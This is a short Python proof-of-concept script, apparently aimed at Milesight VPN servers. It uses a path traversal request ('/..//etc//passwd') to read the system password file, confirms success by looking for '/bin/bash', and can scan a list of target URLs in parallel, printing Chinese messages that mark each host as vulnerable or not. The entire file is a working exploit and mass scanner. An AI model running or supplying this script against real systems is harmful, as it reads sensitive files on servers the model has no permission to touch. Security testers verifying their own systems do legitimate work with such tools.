import requests,argparse,time,sys,os
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool
def banner():
    test = """test"""
    print(test)

def poc(target):
    try:
        # current_dir = os.getcwd()
        # print(current_dir)
        payload = '/..//etc//passwd'
        # payload = payload.replace("../","")
        res1 = requests.get(url=target, verify=False,timeout=10)
        proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
        }
        if res1.status_code == 200:
            # print(res1.text)
            res2 = requests.get(url=target+payload, verify=False,timeout=10,proxies=proxies)
            print(target+payload)
            print(res2.text)

            if res2.status_code == 200 and "/bin/bash" in res2.text:
                print(f"[+]{target}存在漏洞")
                # with open ("Milesight VPN_result.txt","a",encoding="utf-8") as f:
                #     f.write(f"[+]该{target}存在漏洞\n")
            else:
                print(f"[-]该{target}不存在漏洞")
    except Exception as e:
        print(f"[-]{target}可能存在问题")


def main():
    banner()
    parser =argparse.ArgumentParser(description="Milesight VPN server")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")
if __name__ == '__main__':
    main()